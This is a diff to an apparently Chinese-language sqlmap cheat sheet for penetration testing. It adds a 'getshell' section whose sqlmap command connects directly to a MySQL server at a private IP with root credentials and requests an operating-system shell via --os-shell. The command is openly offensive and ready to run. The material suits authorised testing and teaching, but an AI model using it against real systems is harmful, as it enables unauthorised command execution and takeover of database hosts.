@@ -112,3 +112,15 @@ sqlmap -l 1.txt --batch
 
 
 (可以在要检测的注入点加 * 号)
+
+
+
+
+
+#### getshell
+
+```
+sqlmap -d "mysql://root:123456@172.16.15.111:3306/mysql" --os-shell
+```
+
+![image-20250603124738024](./assets/image-20250603124738024.png)
